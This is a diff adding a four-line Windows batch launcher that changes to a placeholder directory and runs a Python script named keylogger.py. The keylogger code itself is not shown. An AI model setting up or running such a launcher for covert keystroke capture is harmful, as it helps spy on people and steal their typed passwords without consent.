@@ -1,0 +1,4 @@
+@echo off
+cd "#input location of program" 
+python3 keylogger.py
+
